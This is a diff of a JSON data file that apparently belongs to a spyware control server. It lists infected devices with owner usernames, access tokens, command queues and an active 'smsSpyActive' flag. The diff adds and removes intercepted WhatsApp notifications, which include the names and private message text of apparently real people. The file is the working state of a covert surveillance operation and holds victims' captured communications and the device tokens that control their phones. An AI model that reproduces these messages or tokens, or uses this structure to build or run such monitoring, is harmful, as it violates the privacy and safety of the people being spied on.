@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "74be2827eaa044a7872739b517404413",
-    "lastSeen": 1776773194718,
+    "lastSeen": 1776773196706,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T08:57:06.800Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Dedy Hk",
+        "content": "Login",
+        "time": "21/04 20:06",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776773197072
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎59 pesan dari 35 chat",
+        "time": "21/04 20:06",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776773196823
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -4003,22 +4019,6 @@
         "time": "21/04 17:14",
         "pkg": "com.whatsapp",
         "receivedAt": 1776762858388
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "prily 🤍",
-        "content": "💟 Stiker",
-        "time": "21/04 17:14",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776762858383
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Kelvin",
-        "content": "Ada kgk?",
-        "time": "21/04 17:14",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776762857895
       }
     ],
     "galleryPhotos": [],
@@ -10387,7 +10387,7 @@
     "deviceName": "HP-SISKA_TAMA-3F6F",
     "ownerUsername": "Ubill_raa",
     "token": "e308898150127caeca3b2487066a87c8",
-    "lastSeen": 1776773194867,
+    "lastSeen": 1776773196986,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T10:19:21.483Z",
